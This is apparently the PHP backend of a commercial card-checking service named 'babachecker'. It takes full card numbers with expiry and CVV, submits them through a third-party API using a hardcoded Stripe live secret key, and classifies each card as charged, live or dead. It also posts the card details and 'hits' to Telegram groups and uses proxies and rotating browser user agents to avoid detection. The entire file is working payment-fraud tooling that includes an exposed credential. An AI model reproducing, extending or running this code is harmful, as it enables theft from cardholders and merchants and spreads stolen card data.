<?php
declare(strict_types=1);
require_once __DIR__ . '/../../app/Bootstrap.php'; // Adjusted path
require_once __DIR__ . '/../../app/Db.php';
require_once __DIR__ . '/../../app/Telegram.php';
header('Content-Type: application/json; charset=utf-8');
use App\Db;
use App\Telegram;
if (empty($_SESSION['uid'])) {
    http_response_code(401);
    echo json_encode(['Response' => 'Session expired']);
    exit;
}
$pdo = Db::pdo();
$uid = (int)$_SESSION['uid'];
$username = $_SESSION['uname'] ?? ('tg_' . $uid);
// Fetch user details
$stmt = $pdo->prepare("SELECT telegram_id, first_name, last_name, status, credits FROM users WHERE id = ? LIMIT 1");
$stmt->execute([$uid]);
$userData = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$userData) {
    echo json_encode(['Response' => 'User not found']);
    exit;
}
$telegramId = $userData['telegram_id'];
$userFirstName = $userData['first_name'] ?? $username;
$userLastName = $userData['last_name'] ?? '';
$userStatus = strtoupper($userData['status'] ?? 'FREE');
$userFullName = trim($userFirstName . ($userLastName ? ' ' . $userLastName : ''));
$currentCredits = (int)$userData['credits'];
if ($userStatus === 'BANNED') {
    echo json_encode(['Response' => 'You are banned from using babachecker.']);
    exit;
}
if ($currentCredits < 5) { // Adjusted to 5 credits for SK BASED 1$ CVV Charge
    echo json_encode(['Response' => 'Insufficient Credits']);
    exit;
}
// Proxy setup from separate GET parameters
$proxyHost = $_GET['host'] ?? '';
$proxyPort = (int)($_GET['port'] ?? 0);
$proxyUsername = $_GET['user'] ?? '';
$proxyPassword = $_GET['pass'] ?? '';
// Validate proxy fields
if (!empty($proxyHost) || !empty($proxyPort) || !empty($proxyUsername) || !empty($proxyPassword)) {
    if (empty($proxyHost) || $proxyPort <= 0) {
        echo json_encode(['Response' => 'Invalid Proxy Format: Host and Port are required']);
        exit;
    }
    $fullProxy = "$proxyUsername:$proxyPassword@$proxyHost:$proxyPort"; // Format for API
} else {
    $fullProxy = '';
}
// Define $proxyRequired based on whether a proxy is provided
$proxyRequired = isset($_GET['useProxy']) && $_GET['useProxy'] === '1';
// ---------- Validate input ----------
$cc1 = $_GET['cc'] ?? '';
$ccParts = explode('|', $cc1);
$cc = trim($ccParts[0] ?? '');
$month = trim($ccParts[1] ?? '');
$year = trim($ccParts[2] ?? '');
$cvv = trim($ccParts[3] ?? '');
$sk = $_GET['sk'] ?? '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';
if (empty($cc1) || !preg_match('/\d{15,16}[|:\/\s]\d{1,2}[|:\/\s]\d{2,4}[|:\/\s]\d{3,4}/', $cc1)) {
    echo json_encode(['Response' => 'Invalid Card Format']);
    exit;
}
// Normalize year
$yearLength = strlen($year);
if ($yearLength <= 2) {
    $year = "20" . $year;
}
// Map month to two digits
$month = sprintf('%02d', (int)$month);
// ---------- helpers ----------
function generateUserAgent() {
    $browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0"
    ];
    return $browsers[array_rand($browsers)];
}
function getBinInfo($binNumber, $ch) {
    $url = "https://bins.antipublic.cc/bins/{$binNumber}";
    $headers = [
        'Accept: application/json',
        'User-Agent: ' . generateUserAgent(),
    ];
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPGET, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode !== 200) {
        return [
            'brand' => 'UNKNOWN',
            'card_type' => 'UNKNOWN',
            'level' => 'STANDARD',
            'issuer' => 'Unknown',
            'country_info' => 'Unknown'
        ];
    }
    $binData = json_decode($response, true) ?: [];
    return [
        'brand' => $binData['brand'] ?? 'UNKNOWN',
        'card_type' => $binData['type'] ?? 'UNKNOWN',
        'level' => $binData['level'] ?? 'STANDARD',
        'issuer' => $binData['bank'] ?? 'Unknown',
        'country_info' => ($binData['country_name'] ?? 'Unknown') . ' ' . ($binData['country_flag'] ?? '')
    ];
}
function updateCredits($pdo, $uid, $deduct, $isLive = false, $isCharged = false) {
    global $currentCredits;
    $newCredits = max(0, $currentCredits - $deduct);
    $lives = $isLive ? 1 : 0;
    $charges = $isCharged ? 1 : 0;
    $stmt = $pdo->prepare("UPDATE users SET credits = ?, lives = lives + ?, charges = charges + ? WHERE id = ?");
    $stmt->execute([$newCredits, $lives, $charges, $uid]);
    return $newCredits;
}
function sendTelegramMessage($botToken, $chatId, $messageHtml) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $messageHtml,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($postData),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode === 200;
}
// Fetch bot token from .env
$botToken = $_ENV['TELEGRAM_BOT_TOKEN'] ?? '';
if (empty($botToken)) {
    echo json_encode(['Response' => 'Bot token missing in config']);
    exit;
}
// ---------- BIN info (use its own curl handle) ----------
$chBin = curl_init();
curl_setopt($chBin, CURLOPT_RETURNTRANSFER, true);
curl_setopt($chBin, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($chBin, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($chBin, CURLOPT_SSL_VERIFYHOST, false);
$bin = substr($cc, 0, 6);
$binInfo = getBinInfo($bin, $chBin);
curl_close($chBin);
// ---------- Request to external API (separate handle) ----------
$start_time = microtime(true);
$apiUrl = "https://api.savvyapi.dev/?lista=$cc|$month|$year|$cvv&sk=$sk&charge_type=cvv&currency=myr&amount=4";
if ($proxyRequired) {
    $apiUrl .= "&proxy={$fullProxy}";
}
$req = curl_init();
curl_setopt_array($req, [
    CURLOPT_URL => $apiUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_HEADER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_HTTPGET => true,
    CURLOPT_CONNECTTIMEOUT => 40,
    CURLOPT_TIMEOUT => 100,
    CURLOPT_ENCODING => '', // accept gzip if any
    CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4,
    CURLOPT_USERAGENT => generateUserAgent(),
    CURLOPT_HTTPHEADER => [
        'Accept: application/json',
        'Cache-Control: no-cache',
        'Pragma: no-cache',
    ],
]);
$response = curl_exec($req);

// echo $response;
// Check for cURL execution failure
if ($response === false) {
    $curlErr = curl_error($req);
    // @file_put_contents(__DIR__ . '/skbased_responses.txt',
    //     "time=" . date('c') . "\nurl={$apiUrl}\ncc={$cc1}\nerr={$curlErr}\nresp=Failed\n\n",
    //     FILE_APPEND
    // );
    $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for error
    echo json_encode([
        'status' => 'dead',
        'Response' => 'Upstream error: ' . ($curlErr ?: 'request failed'),
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    curl_close($req);
    exit;
}
$httpCode = (int)curl_getinfo($req, CURLINFO_HTTP_CODE);
curl_close($req);
// ---------- Small debug log (optional) ----------
// @file_put_contents(__DIR__ . '/skbased_responses.txt',
//     "time=" . date('c') . "\nurl={$apiUrl}\ncc={$cc1}\nhttp={$httpCode}\nresp={$response}\n\n",
//     FILE_APPEND
// );
// If HTTP not OK treat as dead/error
if ($httpCode >= 400 || $httpCode === 0) {
    $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for error
    echo json_encode([
        'status' => 'dead',
        'Response' => "Upstream HTTP {$httpCode}",
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
}
// ---------- Process response ----------
$responseData = json_decode($response, true);
// Ensure $responseData is valid, default to empty array if decoding fails
if ($responseData === null) {
    $responseData = [];
}
$dead_responses = [
    "generic_decline" => "Your card was declined.",
    "You have exceeded the maximum number of declines on this card in the last 24 hour period." => "Card was declined",
    "card_decline_rate_limit_exceeded" => "Card was declined",
    "CARD_GENERIC_ERROR" => "Card was declined",
    "Your card was declined." => "Your card was declined.",
    "do_not_honor" => "Do Not Honor ?",
    "fraudulent" => "Fraudulent ?",
    "setup_intent_authentication_failure" => "setup_intent_authentication_failure ?",
    "invalid_cvc" => "invalid_cvc ?",
    "stolen_card" => "Stolen Card ?",
    "lost_card" => "Lost Card ?",
    "pickup_card" => "Pickup Card ?",
    "incorrect_number" => "Incorrect Card Number ?",
    "Your card has expired." => "Expired Card ?",
    "Expired card." => "Expired Card ?",
    "Invalid expiration year." => "Invalid Expiration Year ?",
    "Proxy is required." => "Proxy is required.",
    "Invalid API Key provided" => "Invalid API Key provided ?",
    "BIN BANNED" => "BIN BANNED ?",
    "expired_card" => "Expired Card ?",
    "SecretKey Connection Failed." => "SK Key Dead ?",
    "intent_confirmation_challenge" => "intent_confirmation_challenge ?",
    "Your card number is incorrect." => "Incorrect Card Number ?",
    "An error occurred while processing the card." => "Error Occurred ?",
    "Your card's expiration year is invalid." => "Expiration Year Invalid ?",
    "Your card's expiration month is invalid." => "Expiration Month Invalid ?",
    "invalid_expiry_month" => "Expiration Month Invalid ?",
    "card is not supported." => "Card Not Supported ?",
    "Proxy connection failed." => "Proxy connection failed. ?",
    "invalid_account" => "Dead Card ?",
    "Invalid API Key provided" => "stripe error . contact support@stripe.com for more details ?",
    "The API key provided does not allow requests from your IP address." => "The API key provided does not allow requests from your IP address.",
    "testmode_charges_only" => "stripe error . contact support@stripe.com for more details ?",
    "api_key_expired" => "stripe error . contact support@stripe.com for more details ?",
    "Your account cannot currently make live charges." => "stripe error . contact support@stripe.com for more details ?",
    "ProxyError" => "Proxy Connection Refused"
];
// Check for live responses
if (stripos($response, 'approved') !== false) {
    $err = 'Payment Successful';
    $new_credits = updateCredits($pdo, $uid, 5, true, true); // 5 credits for approved
    $fullResult =
        "<b>#SKBASED</b>\n" .
        "???????????\n" .
        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
        "[?] <b>Status ?</b> Charged ??\n" .
        "[?] <b>Response ?</b> {$err} ??\n" .
        "[?] <b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "???????????\n" .
        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
        "???????????\n" .
        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[?] <b>Dev ?</b> babachecker";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    $publicMessage =
        "<b>Hit Detected ?</b>\n" .
        "????????\n" .
        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "<b>Status ?</b> <b>Charged ??</b>\n" .
        "<b>Response ?</b> {$err} ??\n" .
        "<b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "????????\n" .
        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";

    sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
    echo json_encode([
        'status' => 'charge',
        'Response' => $err,
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, 'cvc_check: pass') !== false || stripos($response, 'CVV LIVE') !== false) {
    $err = 'CVV LIVE';
    $new_credits = updateCredits($pdo, $uid, 3, true); // 5 credits for live
    $fullResult =
        "<b>#SKBASED</b>\n" .
        "???????????\n" .
        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
        "[?] <b>Status ?</b> Live ?\n" .
        "[?] <b>Response ?</b> {$err}\n" .
        "[?] <b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "???????????\n" .
        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
        "???????????\n" .
        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[?] <b>Dev ?</b> babachecker";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, 'insufficient_funds') !== false || stripos($response, 'card has insufficient funds') !== false) {
    $err = 'Insufficient Funds';
    $new_credits = updateCredits($pdo, $uid, 3, true); // 5 credits for live
    $fullResult =
        "<b>#SKBASED</b>\n" .
        "???????????\n" .
        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
        "[?] <b>Status ?</b> Live ?\n" .
        "[?] <b>Response ?</b> {$err}\n" .
        "[?] <b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "???????????\n" .
        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
        "???????????\n" .
        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[?] <b>Dev ?</b> babachecker";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, 'incorrect_cvc') !== false || stripos($response, 'security code is incorrect') !== false) {
    $err = 'Incorrect CVC';
    $new_credits = updateCredits($pdo, $uid, 3, true); // 5 credits for live
    $fullResult =
        "<b>#SKBASED</b>\n" .
        "???????????\n" .
        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
        "[?] <b>Status ?</b> Live ?\n" .
        "[?] <b>Response ?</b> {$err}\n" .
        "[?] <b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "???????????\n" .
        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
        "???????????\n" .
        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[?] <b>Dev ?</b> babachecker";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, 'transaction_not_allowed') !== false || stripos($response, 'Your card does not support this type of purchase') !== false) {
    $err = 'Your card does not support this type of purchase';
    $new_credits = updateCredits($pdo, $uid, 3, true); // 5 credits for live
    $fullResult =
        "<b>#SKBASED</b>\n" .
        "???????????\n" .
        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
        "[?] <b>Status ?</b> Live ?\n" .
        "[?] <b>Response ?</b> {$err}\n" .
        "[?] <b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "???????????\n" .
        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
        "???????????\n" .
        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[?] <b>Dev ?</b> babachecker";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);

    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} elseif (stripos($response, '3DS challenge required') !== false || stripos($response, 'card_error_authentication_required') !== false || stripos($response, 'is3DSecureRequired') !== false || stripos($response, 'requires_action') !== false || stripos($response, 'stripe_3ds2_fingerprint') !== false) {
    $err = '3DS Required';
    $new_credits = updateCredits($pdo, $uid, 3, true); // 5 credits for live
    $fullResult =
        "<b>#SKBASED</b>\n" .
        "???????????\n" .
        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
        "[?] <b>Status ?</b> Live ?\n" .
        "[?] <b>Response ?</b> {$err}\n" .
        "[?] <b>Gateway ?</b> SK BASED 1$ CVV\n" .
        "???????????\n" .
        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
        "???????????\n" .
        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
        "[?] <b>Dev ?</b> babachecker";
    if (!empty($telegramId)) {
        sendTelegramMessage($botToken, $telegramId, $fullResult);
    }
    sendTelegramMessage($botToken, '-1002890276135', $fullResult);
    echo json_encode([
        'status' => 'live',
        'Response' => $err,
        'Gateway' => 'SK BASED 1$ CVV',
        'cc' => $cc1,
        'credits' => $new_credits,
        'brand' => $binInfo['brand'],
        'card_type' => $binInfo['card_type'],
        'level' => $binInfo['level'],
        'issuer' => $binInfo['issuer'],
        'country_info' => $binInfo['country_info']
    ]);
    exit;
} else {
    // Check for dead responses
    $deadFound = false;
    foreach ($dead_responses as $deadKey => $deadValue) {
        if (stripos($response, $deadKey) !== false) {
            $err = $deadValue;
            $deadFound = true;
            break;
        }
    }
    if ($deadFound) {
        $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for dead
        echo json_encode([
            'status' => 'dead',
            'Response' => $err,
            'Gateway' => 'SK BASED 1$ CVV',
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $binInfo['brand'],
            'card_type' => $binInfo['card_type'],
            'level' => $binInfo['level'],
            'issuer' => $binInfo['issuer'],
            'country_info' => $binInfo['country_info']
        ]);
        exit;
    } else {
        $err = $responseData['result'] ?? $response;
        $new_credits = updateCredits($pdo, $uid, 0); // No credit deduction for unknown
        echo json_encode([
            'status' => 'dead',
            'Response' => "Proxy or API Issue",
            'Gateway' => 'SK BASED 1$ CVV',
            'cc' => $cc1,
            'credits' => $new_credits,
            'brand' => $binInfo['brand'],
            'card_type' => $binInfo['card_type'],
            'level' => $binInfo['level'],
            'issuer' => $binInfo['issuer'],
            'country_info' => $binInfo['country_info']
        ]);
        exit;
    }
}
?>

